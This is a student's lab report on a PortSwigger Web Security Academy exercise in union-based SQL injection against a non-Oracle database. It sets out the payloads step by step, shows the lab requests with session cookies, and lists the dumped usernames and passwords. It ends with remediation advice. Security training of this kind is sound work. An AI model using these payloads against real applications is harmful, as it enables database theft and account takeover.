# PortSwigger Web Security Academy Lab Report  SQL Injection Attack: Listing Database Contents on Non-Oracle Databases



**Report ID:** PS-LAB-005

**Author:** Venu Kumar (Venu)  

**Date:** February 06, 2026  

**Lab Level:** Practitioner  

**Lab Title:** SQL injection attack, listing the database contents on non-Oracle databases



## Executive Summary

**Vulnerability Type:** SQL Injection (Union-based)  

**Severity:** High (CVSS 3.1 Score: 8.6 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:** A SQL injection vulnerability was identified in the `category` parameter of the `/filter` endpoint on a simulated e-commerce website. The query results are reflected in the response, enabling UNION attacks to retrieve data from other tables. The database is non-Oracle (e.g., PostgreSQL), containing a `users` table with `username` and `password` columns. Exploitation involved determining column count, querying `information_schema` for table/column names, and extracting credentials.

**Impact:** In production, this allows full database enumeration, credential theft (including administrator access), data modification, or privilege escalation.

**Status:** Successfully exploited in a controlled lab environment only; no real-world impact. Report for educational purposes.



## Environment and Tools Used

**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – for request interception, modification, and analysis  

**Operating System:** Windows 11  

**Test Date/Time:** February 06, 2026, approximately 04:17 PM IST



## Methodology

Conducted following ethical hacking best practices in a safe, simulated environment.

1. Accessed the lab via "Access the lab" in PortSwigger Academy.  
2. Added base URL to Burp Suite target scope.  
3. Enabled Intercept in Burp Proxy; navigated to product category filter to capture `GET /filter?category=...` request.  
4. Tested for injection: `category='` → triggered SQL error (vulnerability confirmed).  
5. Determined number of columns: `'+UNION+SELECT+NULL,NULL--` (increment NULLs until no error).  
6. Retrieved table names from `information_schema.tables`: `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`  
7. Retrieved column names for `users` table: `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--`  
8. Extracted credentials: `'+UNION+SELECT+username,password+FROM+users--`  
9. Logged in as `administrator` using retrieved password.



## Detailed Findings

**Vulnerable Endpoint:** `GET /filter?category=...`

**Original Request (Example):**

```http
GET /filter?category=Gifts HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
...

Injection Test (Error Triggered):

GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/2
Host: 0a2b009104512070d572f38800020044.web-security-academy.net
Cookie: session=5ARYZkWVvhgbD47AAXN29US0mIwGbedR

Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
...
<h1>' UNION SELECT 'abc','def'--</h1>
...
<table>
  <tr>
    <th>abc</th>
    <td>def</td>
  </tr>
</table>


Successful UNION Exploitation (Extract Credentials):

GET /filter?category=Gifts'+UNION+SELECT+username_ihykoy,+password_jzywxw+FROM+users_padysk-- HTTP/2
Host: 0a9d00f703222058803a8aa100c70047.web-security-academy.net
Cookie: session=kJbxExTQr6twXFYGd4L9P2eXbY1aiif1
...


Response: 

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

<h1>Gifts' UNION SELECT username_ihykoy, password_jzywxw FROM users_padysk--</h1>

<table>
<tr><th>wiener</th><td>18ey652t394ilk73v67p</td></tr>
<tr><th>carlos</th><td>fftudkax4m9f2wb8k33u</td></tr>
<tr><th>administrator</th><td>n43hvb90m49ddbmwxzb8</td></tr>
</table>


Proof of Exploitation:


![Proof of SQL Injection Error](https://github.com/venu-maxx/PortSwigger-SQLI-Lab-5/blob/8170dbac26b7552bd3fe65ee1ec4d7fdd627646b/Portswigger%20Lab%205%20error.png)

Figure 1: Database error after injecting single quote ('), confirming injecti


![Proof of Successful Exploitation](https://github.com/venu-maxx/PortSwigger-SQLI-Lab-5/blob/9eb7ce7f106f9286a18085083769e49d746338bc/Portswigger%20Lab%205%20success.png)

Figure 2: PortSwigger Academy "Congratulations, you solved the lab!" banner.


![Lab Solved Congratulations](https://github.com/venu-maxx/PortSwigger-SQLI-Lab-5/blob/09186c168426f7d8a56b75425363797bd5d9aae6/Portswigger%20Lab%205%20Completion.png)

Figure 3: Portswigger Lab Completed Successfully 


Exploitation Explanation:

The vulnerable query is like SELECT title, description FROM products WHERE category = '[input]'.
Single quote closes string → error.
UNION SELECT appends results from other queries (must match column count).
Used information_schema views (non-Oracle) to enumerate tables/columns.
Final payload: ' UNION SELECT username, password FROM users -- dumps credentials.


Risk Assessment:

Likelihood of Exploitation: High (reflected results + no sanitization).
Potential Impact: Critical — full database dump, credential theft, account takeover.
Affected Components: Backend database (PostgreSQL/MySQL based on lab setup).


Recommendations for Remediation:

Use prepared statements / parameterized queries (e.g., PDO in PHP, PreparedStatement in Java).
Implement strict input validation and sanitization (escape special characters).
Deploy WAF to detect/block SQLi patterns (including UNION).
Apply least privilege to application DB accounts.
Conduct regular code reviews and scanning (OWASP ZAP, sqlmap, Burp Scanner).


Conclusion and Lessons Learned:

This lab demonstrated union-based SQL injection to enumerate and extract database contents on non-Oracle systems.
Key Takeaways:
Determine column count with incremental NULL in UNION.
Use information_schema for non-Oracle DB enumeration.
Strengthened skills in blind/reflected SQLi, payload crafting, and ethical reporting.


References:

PortSwigger Academy: SQL Injection
Specific Lab: SQL injection attack, listing the database contents on non-Oracle databases
